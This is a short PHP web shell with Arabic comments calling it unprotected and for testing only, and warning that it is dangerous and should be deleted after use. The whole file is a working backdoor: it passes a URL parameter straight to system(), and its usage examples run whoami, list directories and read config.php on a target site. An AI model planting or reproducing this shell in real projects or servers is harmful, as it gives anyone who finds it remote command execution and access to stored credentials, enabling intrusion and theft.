<?php
// ==================================================
// WEB SHELL - بدون حماية - لأغراض الاختبار فقط
// ==================================================
// تحذير: هذا الملف خطير جداً. احذفه فور انتهاء الاختبار.

// طريقة الاستخدام:
// http://target.com/shell.php?cmd=whoami
// http://target.com/shell.php?cmd=ls -la
// http://target.com/shell.php?cmd=cat config.php

if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "<h3>Web Shell Active</h3>";
    echo "Use: ?cmd=command<br>";
    echo "Example: ?cmd=whoami";
}
?>
